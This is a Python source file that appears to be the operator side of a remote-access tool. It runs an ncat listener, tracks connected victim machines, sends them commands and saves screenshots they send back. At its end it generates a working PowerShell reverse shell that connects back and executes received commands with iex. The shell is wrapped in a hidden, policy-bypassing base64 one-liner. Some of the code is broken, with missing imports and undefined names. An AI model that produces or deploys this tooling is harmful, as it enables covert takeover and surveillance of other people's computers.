import subprocess
import os
import time
import threading
import queue
import logging
from datetime import datetime
from pathlib import Path
import base64
from typing import Dict, Optional, List
import win32process
import win32con
import win32gui
from PyQt6.QtCore import QThread, pyqtSignal
from typing import Optional, Dict
import subprocess
import os
import time
import threading
import queue
import logging
from datetime import datetime
import psutil

class ServerMonitorThread(QThread):
    clientsUpdated = pyqtSignal(list)
    error = pyqtSignal(str)
    
    def __init__(self, port):
        super().__init__()
        self.port = port
        self.current_port = port  # Added this line to fix the error
        self.running = True
        self.logger = logging.getLogger(__name__)
        self._previous_connections = set()
        self._lock = threading.Lock()

    def run(self):
        """Monitor server connections"""
        while self.running:
            try:
                # Get current connections
                connections = self._check_connections()
                current_connection_ids = {c['client_id'] for c in connections}
                
                # Check for new or lost connections
                if current_connection_ids != self._previous_connections:
                    self.logger.info(f"Connection change detected. Current: {current_connection_ids}")
                    self.clientsUpdated.emit(connections)
                    self._previous_connections = current_connection_ids
                
                time.sleep(1)  # Check every second
                
            except Exception as e:
                self.logger.error(f"Error in monitor thread: {str(e)}")
                self.error.emit(str(e))
                time.sleep(1)

    def _check_connections(self):
        """Check for active connections"""
        connections = []
        try:
            output = subprocess.check_output(
                'netstat -n | findstr "ESTABLISHED LISTENING SYN_SENT"',
                shell=True
            ).decode()
            
            for line in output.splitlines():
                # Only process lines containing our listening port
                if str(self.current_port) in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        local_addr, remote_addr = parts[1:3]
                        state = parts[3] if len(parts) > 3 else "UNKNOWN"
                        
                        try:
                            if ':' in remote_addr and remote_addr != '0.0.0.0:0':
                                local_ip, local_port = local_addr.split(':')
                                remote_ip, remote_port = remote_addr.split(':')
                                
                                # Only track connections where we are the listener
                                # (local port matches our listening port)
                                if local_port == str(self.current_port):
                                    client_id = f"{remote_ip}:{remote_port}"
                                    
                                    # Log connection attempt
                                    self.logger.debug(f"Found connection: {client_id} State: {state}")
                                    
                                    # Only track ESTABLISHED connections
                                    if state == "ESTABLISHED":
                                        client_info = {
                                            'client_id': client_id,
                                            'name': f"Client-{len(connections) + 1}",
                                            'os': 'Windows',  # Default, will be updated later
                                            'address': [remote_ip, remote_port],
                                            'connected_at': datetime.now().isoformat(),
                                            'last_seen': datetime.now().isoformat(),
                                            'status': 'connected',
                                            'ping': '0ms'
                                        }
                                        connections.append(client_info)
                                        self.logger.info(f"Active connection found: {client_id}")
                        except Exception as e:
                            self.logger.error(f"Error parsing connection {line}: {e}")
                            continue
                            
            return connections
            
        except subprocess.CalledProcessError:
            self.logger.debug("No connections found")
            return []
        except Exception as e:
            self.logger.error(f"Error checking connections: {e}")
            return []


    def stop(self):
        """Stop the monitor thread"""
        self.running = False

class ServerManager:
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self._lock = threading.Lock()  # Add this line before any other attributes
        self.ncat_process = None
        self.server_running = False
        self.ncat_path = self._find_ncat_path()
        self.current_port = None
        self.monitor_thread = None
        self.response_queues = {}
        self.active_clients = {}
        self.command_history = {}
        self._output_buffer = queue.Queue()
        self._stop_event = threading.Event()
        self.current_client_id = None
        self.client_shells = {}

    def _find_ncat_path(self) -> str:
        """Find ncat path"""
        common_paths = [
            r"C:\Program Files (x86)\Nmap\ncat.exe",
            r"C:\Program Files\Nmap\ncat.exe",
            "ncat"
        ]
        for path in common_paths:
            if os.path.exists(path):
                self.logger.debug(f"Found ncat at: {path}")
                return path
        return "ncat"

    def start_server(self, ip: str, port: int, verbose: bool = True, keep_listening: bool = True) -> bool:
        """Start ncat listener with proper process handling"""
        try:
            if self.server_running:
                return False

            # Clean up any existing listeners
            self._cleanup_existing_listeners(port)

            # Build ncat command with proper path quoting
            ncat_path = self._find_ncat_path()
            
            # Build the command list
            cmd = [ncat_path, "-4", "-l", ip, "-p", str(port)]
            if verbose:
                cmd.append("-v")
            if keep_listening:
                cmd.append("-k")

            self.logger.debug(f"Starting ncat with command: {' '.join(cmd)}")
            
            # Start ncat process with pipe redirection
            self.ncat_process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0,  # Unbuffered
                universal_newlines=True  # Text mode
            )
            
            # Short delay to allow listener to start
            time.sleep(1)
            
            # Verify process started successfully
            if self.ncat_process.poll() is not None:
                raise Exception("Failed to start ncat process")

            self.server_running = True
            self.current_port = port
            
            # Start monitoring threads
            self._stop_event.clear()
            self._start_monitoring_threads()
            
            self.logger.info(f"Server successfully started on {ip}:{port}")
            return True
                
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
            self.stop_server()
            return False


    def _read_output(self):
        """Read output from ncat process with improved handling"""
        try:
            while not self._stop_event.is_set() and self.ncat_process:
                line = self.ncat_process.stdout.readline()
                if not line:
                    continue
                    
                line = line.strip()
                if line:
                    try:
                        # Try to parse as JSON first (for system info)
                        try:
                            data = json.loads(line)
                            if isinstance(data, dict) and 'Hostname' in data:
                                # Update client info
                                if self.current_client_id and self.current_client_id in self.active_clients:
                                    self.active_clients[self.current_client_id].update({
                                        'hostname': data['Hostname'],
                                        'os': data['OS'],
                                        'username': data['Username'],
                                        'elevated': data['Elevated'],
                                        'version': data.get('Version', 'Unknown'),
                                        'architecture': data.get('Architecture', 'Unknown')
                                    })
                        except json.JSONDecodeError:
                            # Not JSON, treat as regular output
                            self._output_buffer.put({
                                'type': 'output',
                                'data': line,
                                'timestamp': datetime.now().isoformat()
                            })
                    except Exception as e:
                        self.logger.error(f"Error processing output: {e}")
                        
        except Exception as e:
            self.logger.error(f"Error in output reader: {e}")
        finally:
            self.logger.info("Output reader stopped")

    def _update_clients(self, clients):
        """Update active clients list"""
        self.active_clients = {
            client['client_id']: client for client in clients
        }

    def get_current_client(self) -> Optional[str]:
        """Get current active client ID"""
        return self.current_client_id

    def set_current_client(self, client_id: str) -> bool:
        """Set the current active client"""
        try:
            if client_id in self.active_clients:
                self.current_client_id = client_id
                self.logger.info(f"Current client set to: {client_id}")
                return True
            return False
        except Exception as e:
            self.logger.error(f"Error setting current client: {e}")
            return False

    def is_client_connected(self, client_id: str) -> bool:
        """Check if client is connected with improved verification"""
        try:
            with self._lock:
                client = self.active_clients.get(client_id)
                if not client:
                    return False
                    
                # Check if client was seen recently (within last 10 seconds)
                if (datetime.now() - client['last_seen']).total_seconds() > 10:
                    client['status'] = 'disconnected'
                    return False
                    
                return client['status'] == 'connected'
                
        except Exception as e:
            self.logger.error(f"Error checking client connection: {e}")
            return False
        
    def launch_shell(self, client_id: str) -> bool:
        try:
            if not self.is_client_connected(client_id):
                return False
                
            with self._lock:
                # Remove any existing shell reference
                if client_id in self.client_shells:
                    self.client_shells.pop(client_id, None)
                
                # Create new shell window
                from remote_shell import RemoteShellWindow
                shell = RemoteShellWindow(self, client_id)
                self.client_shells[client_id] = shell
                shell.show()
                return True
                    
        except Exception as e:
            self.logger.error(f"Error launching shell: {e}")
            return False

    def is_shell_open(self, client_id: str) -> bool:
        """Check if a shell is currently open for the client"""
        try:
            with self._lock:
                return (client_id in self.client_shells and 
                        self.client_shells[client_id].isVisible())
        except Exception as e:
            self.logger.error(f"Error checking shell status: {e}")
            return False

    def cleanup_shell(self, client_id: str):
        """Clean up shell resources while maintaining connection"""
        try:
            with self._lock:
                if client_id in self.response_queues:
                    while not self.response_queues[client_id].empty():
                        try:
                            self.response_queues[client_id].get_nowait()
                        except queue.Empty:
                            break
        except Exception as e:
            self.logger.error(f"Error cleaning up shell: {e}")

    def _handle_monitor_error(self, error_msg):
        """Handle monitoring errors"""
        self.logger.error(f"Monitor error: {error_msg}")

    def _start_connection_monitor(self):
        """Start connection monitoring"""
        self.connection_monitor = threading.Thread(
            target=self._monitor_connections,
            daemon=True,
            name="ConnectionMonitor"
        )
        self.connection_monitor.start()

    def _start_monitoring_threads(self):
        """Start all monitoring threads"""
        try:
            # Output monitor thread
            self.output_monitor = threading.Thread(
                target=self._monitor_output,
                daemon=True,
                name="OutputMonitor"
            )
            self.output_monitor.start()

            # Connection monitor thread
            self.connection_monitor = threading.Thread(
                target=self._monitor_connections,
                daemon=True,
                name="ConnectionMonitor"
            )
            self.connection_monitor.start()

            # Error monitor thread
            self.stderr_monitor = threading.Thread(
                target=self._monitor_stderr,
                daemon=True,
                name="StderrMonitor"
            )
            self.stderr_monitor.start()

        except Exception as e:
            self.logger.error(f"Error starting monitoring threads: {e}")
            raise

    def _cleanup_existing_listeners(self, port: int):
        """Kill any existing ncat processes on the specified port"""
        try:
            cmd = f'for /f "tokens=5" %a in (\'netstat -aon ^| find ":{port}" ^| find "LISTENING"\') do taskkill /F /PID %a'
            subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL)
            time.sleep(1)
        except Exception as e:
            self.logger.warning(f"Error cleaning up existing listeners: {e}")

    def _monitor_connections(self):
        """Monitor connections with improved handling"""
        try:
            while self.server_running and not self._stop_event.is_set():
                try:
                    # Check ncat process
                    if not self.ncat_process or self.ncat_process.poll() is not None:
                        self.logger.error("Ncat process terminated unexpectedly")
                        self._reconnect_if_needed()
                        time.sleep(1)
                        continue

                    self._check_netstat_connections()
                    time.sleep(1)
                except Exception as e:
                    self.logger.error(f"Error in connection monitor: {e}")
                    time.sleep(1)
        finally:
            self.logger.info("Connection monitor stopped")

    def _monitor_stdout(self):
        """Monitor Ncat stdout for responses"""
        try:
            while self.server_running and self.ncat_process:
                try:
                    # Read line directly without select
                    line = self.ncat_process.stdout.readline()
                    if line:
                        line = line.rstrip('\n')
                        self.logger.debug(f"Raw stdout: {line}")
                        
                        # Send to default client or all active clients
                        with self._lock:
                            if 'default' in self.response_queues:
                                self.response_queues['default'].put({
                                    'type': 'output',
                                    'data': line,
                                    'timestamp': datetime.now().isoformat()
                                })
                                self.logger.debug(f"Output queued for default client: {line}")
                            
                        # Update last seen time for active connection
                        if 'default' in self.active_clients:
                            self.active_clients['default']['last_seen'] = datetime.now()
                            
                except Exception as inner_e:
                    if isinstance(inner_e, IOError):  # Handle pipe errors
                        self.logger.debug("Pipe closed or error")
                        break
                    self.logger.error(f"Error reading stdout: {inner_e}")
                    
                # Clean up old clients periodically
                self._cleanup_old_clients()
                    
        except Exception as e:
            self.logger.error(f"Error in stdout monitor: {e}")
            self.logger.exception(e)

    def _monitor_output(self):
        """Monitor process output"""
        try:
            while not self._stop_event.is_set() and self.server_running:
                if not self.ncat_process or self.ncat_process.poll() is not None:
                    break

                try:
                    # Already in text mode
                    line = self.ncat_process.stdout.readline()
                    if line:
                        text = line.strip()
                        if text:
                            self.logger.debug(f"[stdout] {text}")
                            if self.current_client_id and self.current_client_id in self.response_queues:
                                self.response_queues[self.current_client_id].put({
                                    'type': 'output',
                                    'data': text,
                                    'timestamp': datetime.now().isoformat()
                                })

                except Exception as e:
                    if isinstance(e, (IOError, ValueError)) and "closed" in str(e).lower():
                        break
                    self.logger.error(f"Error reading stdout: {e}")
                    time.sleep(0.1)

        except Exception as e:
            self.logger.error(f"Fatal error in output monitor: {e}")
        finally:
            self.logger.info("Output monitor stopped")


    def _check_netstat_connections(self):
        """Check netstat for established connections with improved parsing"""
        if not self.server_running or not self.current_port:
            return
            
        try:
            cmd = 'netstat -n | findstr ESTABLISHED'
            output = subprocess.check_output(cmd, shell=True).decode()
            
            established_connections = set()
            
            for line in output.splitlines():
                if str(self.current_port) not in line:
                    continue
                    
                parts = line.split()
                if len(parts) >= 4:  # Make sure we have enough parts
                    local_addr = parts[1]
                    remote_addr = parts[2]
                    
                    try:
                        local_ip, local_port = local_addr.rsplit(':', 1)
                        remote_ip, remote_port = remote_addr.rsplit(':', 1)
                        
                        # Only track connections where WE are the listener
                        if local_port == str(self.current_port):
                            client_id = f"{remote_ip}:{remote_port}"
                            
                            # Add to active clients if new
                            with self._lock:
                                if client_id not in self.active_clients:
                                    self.logger.info(f"[+] New client detected: {client_id}")
                                    self.active_clients[client_id] = {
                                        'client_id': client_id,
                                        'name': f'Client-{len(self.active_clients) + 1}',
                                        'os': 'Windows',
                                        'address': [remote_ip, remote_port],
                                        'connected_at': datetime.now(),
                                        'last_seen': datetime.now(),
                                        'status': 'connected',
                                        'ping': '0ms'
                                    }
                                    
                                    if client_id not in self.response_queues:
                                        self.response_queues[client_id] = queue.Queue()
                                else:
                                    # Update existing client
                                    self.active_clients[client_id]['last_seen'] = datetime.now()
                                    self.active_clients[client_id]['status'] = 'connected'
                                    
                                established_connections.add(client_id)
                            
                    except Exception as e:
                        self.logger.error(f"Error processing connection {line}: {e}")
                        continue
                        
            # Update disconnected clients
            with self._lock:
                for client_id in list(self.active_clients.keys()):
                    if client_id not in established_connections:
                        if self.active_clients[client_id]['status'] != 'disconnected':
                            self.logger.info(f"[-] Client disconnected: {client_id}")
                            self.active_clients[client_id]['status'] = 'disconnected'
                        
        except subprocess.CalledProcessError as e:
            self.logger.debug(f"No established connections found")
        except Exception as e:
            self.logger.error(f"Error checking netstat: {e}")

    def _check_client_connections(self):
        """Periodic check of client connections"""
        try:
            with self._lock:
                current_time = datetime.now()
                for client_id, client in list(self.active_clients.items()):
                    # Check if client is still responsive
                    try:
                        if not self._check_client_alive(client_id):
                            client['status'] = 'disconnected'
                            self.logger.info(f"Client {client_id} marked as disconnected")
                        else:
                            client['status'] = 'connected'
                            client['last_seen'] = current_time
                    except Exception as e:
                        self.logger.error(f"Error checking client {client_id}: {e}")
                        
        except Exception as e:
            self.logger.error(f"Error in connection check: {e}")


    def _monitor_stderr(self):
        """Monitor ncat's stderr for connections and disconnections"""
        try:
            while not self._stop_event.is_set() and self.ncat_process:
                line = self.ncat_process.stderr.readline()
                if not line:
                    continue
                    
                try:
                    line = line.strip()
                    if line:
                        self.logger.debug(f"Ncat stderr: {line}")
                        if "Connection from" in line:
                            self._handle_connect(line)
                        elif "Connection closed" in line:
                            self._handle_disconnect(line)
                except Exception as e:
                    self.logger.error(f"Error processing stderr line: {e}")
                    
        except Exception as e:
            self.logger.error(f"Error in stderr monitor: {e}")
        finally:
            self.logger.info("Stderr monitor stopped")


    def _handle_connect(self, message):
        """Handle new client connection with improved parsing"""
        try:
            self.logger.info(f"Processing connection message: {message}")
            
            # Parse connection message
            import re
            match = re.search(r'Connection from ([0-9.]+):(\d+)', message)
            if match:
                ip, port = match.groups()
                client_id = f"{ip}:{port}"
                
                with self._lock:
                    # Create or update client entry
                    self.active_clients[client_id] = {
                        'client_id': client_id,
                        'name': f'Client-{len(self.active_clients) + 1}',
                        'os': 'Windows',
                        'address': [ip, port],
                        'connected_at': datetime.now(),
                        'last_seen': datetime.now(),
                        'status': 'connected',
                        'ping': '0ms'
                    }
                    
                    if client_id not in self.response_queues:
                        self.response_queues[client_id] = queue.Queue()
                    
                    self.current_client_id = client_id
                    
                    self.logger.info(f"New client connected: {client_id}")
                    
        except Exception as e:
            self.logger.error(f"Error handling connection: {e}")


    def _handle_disconnect(self, message):
        """Handle client disconnection"""
        try:
            parts = message.split()
            addr_part = next((p for p in parts if ':' in p), None)
            if addr_part:
                ip, port = addr_part.split(':')
                client_id = f"{ip}:{port}"
                
                with self._lock:
                    if client_id in self.active_clients:
                        self.active_clients[client_id]['status'] = 'disconnected'
                        self.logger.info(f"Client disconnected: {client_id}")
                        
                    if client_id == self.current_client_id:
                        self.current_client_id = None
                        
        except Exception as e:
            self.logger.error(f"Error handling disconnect: {e}")

    def _handle_new_connection(self, message: str):
        """Process new client connection"""
        try:
            parts = message.split()
            ip_port = next(p for p in parts if ':' in p)
            ip, port = ip_port.rstrip('.').split(':')
            ip = ip.strip('[]')
            
            client_id = f"{ip}:{port}"
            
            with self._lock:
                # Create new client entry
                self.active_clients[client_id] = {
                    'client_id': client_id,
                    'name': f'Client-{len(self.active_clients) + 1}',
                    'os': 'Unknown',
                    'language': 'Unknown',
                    'webcam': 'Unknown',
                    'ping': 'N/A',
                    'address': [ip, port],
                    'connected_at': datetime.now(),
                    'last_seen': datetime.now(),
                    'status': 'connected'
                }
                
                # Initialize response queue
                self.response_queues[client_id] = queue.Queue()
                
                self.logger.info(f"New client connected: {client_id}")
                
                # Request system info
                self.send_command(client_id, "systeminfo")
                
        except Exception as e:
            self.logger.error(f"Error handling new connection: {e}")

    def _handle_disconnection(self, message: str):
        """Process client disconnection"""
        try:
            # Parse disconnection message
            parts = message.split()
            addr_part = next(p for p in parts if ':' in p)
            ip, port = addr_part.split(':')
        
            # Find the client and update its status instead of removing it
            with self._lock:
                for client_id in list(self.active_clients.keys()):
                    client = self.active_clients[client_id]
                    if client['address'] == (ip, port):
                        self.logger.info(f"Client disconnected: {client_id}")
                        # Update status instead of deleting
                        client['status'] = 'disconnected'
                        client['last_seen'] = datetime.now()
                        # Don't delete response queues or command history
                    
        except Exception as e:
            self.logger.error(f"Error handling disconnection: {e}")

    def send_command(self, client_id: str, command: str) -> bool:
        try:
            if not self.server_running or not self.ncat_process:
                return False

            if not self.is_client_connected(client_id):
                return False

            # Add command terminator
            full_command = f"{command.strip()}\n"
            
            self.ncat_process.stdin.write(full_command)
            self.ncat_process.stdin.flush()
            
            with self._lock:
                if client_id in self.active_clients:
                    self.active_clients[client_id]['last_seen'] = datetime.now()
                    
                if client_id not in self.command_history:
                    self.command_history[client_id] = []
                self.command_history[client_id].append({
                    'timestamp': datetime.now(),
                    'command': command.strip()
                })
                
            return True
            
        except Exception as e:
            self.logger.error(f"Error sending command: {e}")
            return False

    def _reconnect_if_needed(self):
        """Attempt to reconnect if connection is lost"""
        try:
            if self.current_port and not self.server_running:
                self.logger.info("Attempting to reconnect server...")
                self.start_server("0.0.0.0", self.current_port)
        except Exception as e:
            self.logger.error(f"Error reconnecting: {e}")

    def get_client_response(self, client_id: str, timeout: float = 0.1) -> Optional[Dict]:
        try:
            if not self.server_running or not self.ncat_process:
                return None

            if self.ncat_process.poll() is not None:
                return None

            try:
                line = self.ncat_process.stdout.readline()
                if line:
                    text = line.strip()
                    if text:
                        self.logger.debug(f"[stdout] {text}")
                        return {
                            'type': 'output',
                            'data': text,
                            'timestamp': datetime.now().isoformat()
                        }
            except Exception as e:
                self.logger.error(f"Error reading stdout: {e}")
                
            return None
                    
        except Exception as e:
            self.logger.error(f"Error getting response: {e}")
            return None

    def get_active_clients(self) -> list:
        """Get list of active clients"""
        try:
            with self._lock:
                return list(self.active_clients.values())
        except Exception as e:
            self.logger.error(f"Error getting active clients: {e}")
            return []

    def _check_server_status(self):
        """Check if server is still running properly"""
        try:
            if not self.ncat_process or self.ncat_process.poll() is not None:
                raise ProcessError("Server process has terminated")
            return True
        except Exception as e:
            self.logger.error(f"Server status check failed: {e}")
            return False

    def _handle_screenshot_data(self, client_id: str, data: dict):
        """Handle screenshot data from client"""
        try:
            if 'ImageData' not in data:
                return
                
            # Create screenshots directory if it doesn't exist
            screenshots_dir = Path("screenshots")
            screenshots_dir.mkdir(exist_ok=True)
            
            # Save screenshot
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{client_id.replace(':', '_')}_{timestamp}.png"
            filepath = screenshots_dir / filename
            
            # Decode and save
            image_data = base64.b64decode(data['ImageData'])
            with open(filepath, 'wb') as f:
                f.write(image_data)
                
            return {
                'filepath': str(filepath),
                'timestamp': timestamp,
                'resolution': data.get('Resolution', 'Unknown')
            }
        except Exception as e:
            self.logger.error(f"Error handling screenshot: {e}")
            return None

    def disconnect_client(self, client_id: str) -> bool:
        """Disconnect client"""
        with self._lock:
            if self.client_connected:
                self._handle_disconnect()
            return True

    def stop_server(self):
        """Stop the server and clean up"""
        try:
            self._stop_event.set()
            
            if self.monitor_thread:
                self.monitor_thread.stop()
                self.monitor_thread.wait()
                self.monitor_thread = None
            
            if self.current_port:
                self._cleanup_existing_listeners(self.current_port)
            
            self.server_running = False
            self.active_clients = {}
            self.current_port = None
            
            self.logger.info("Server stopped successfully")
            return True
                
        except Exception as e:
            self.logger.error(f"Error stopping server: {e}")
            return False

    def get_client_info(self, client_id: str) -> Optional[Dict]:
        """Get detailed client information"""
        with self._lock:
            return self.active_clients.get(client_id)

    def get_command_history(self, client_id: str) -> List[Dict]:
        """Get command history for a client"""
        with self._lock:
            return self.command_history.get(client_id, [])

    def _cleanup_old_clients(self):
        """Remove disconnected clients"""
        try:
            with self._lock:
                current_time = datetime.now()
                to_remove = []
                
                # Check each client
                for client_id, client in self.active_clients.items():
                    # Skip the default client if the server is running
                    if client_id == 'default' and self.server_running and self.ncat_process:
                        continue
                        
                    if any([
                        # Remove if server is not running
                        not self.server_running,
                        # Remove if process is not running
                        not self.ncat_process or self.ncat_process.poll() is not None,
                        # Remove if not seen recently
                        (current_time - client['last_seen']).total_seconds() > 5
                    ]):
                        to_remove.append(client_id)
                
                # Remove identified clients
                for client_id in to_remove:
                    self.logger.debug(f"Removing inactive client: {client_id}")
                    del self.active_clients[client_id]
                    if client_id in self.response_queues:
                        del self.response_queues[client_id]
                    if client_id in self.command_history:
                        del self.command_history[client_id]
                        
        except Exception as e:
            self.logger.error(f"Error in cleanup: {e}")

class PowerCatClientHandler:
    """Handler for PowerCat client connections"""
    
    @staticmethod
    def generate_client_payload(ip: str, port: int, encode: bool = True) -> str:
        """Generate PowerCat reverse shell payload"""
        payload = f"""
        $client = New-Object System.Net.Sockets.TCPClient('{ip}', {port});
        $stream = $client.GetStream();
        [byte[]]$bytes = 0..65535|%{{0}};
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell `n`r");
        $stream.Write($sendbytes,0,$sendbytes.Length);

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {{
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            try {{
                $sendback = (iex $data 2>&1 | Out-String );
                $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush();
            }} catch {{
                $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
                $sendbyte = ([text.encoding]::ASCII).GetBytes($error[0].ToString());
                $stream.Write($sendbyte,0,$sendbyte.Length);
                $stream.Flush();
            }}
        }}
        $client.Close();
        """
        
        if encode:
            # Convert to base64 for PowerShell execution
            bytes_payload = payload.encode('utf-16le')
            b64_payload = base64.b64encode(bytes_payload).decode()
            return f"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_payload}"
        
        return payload
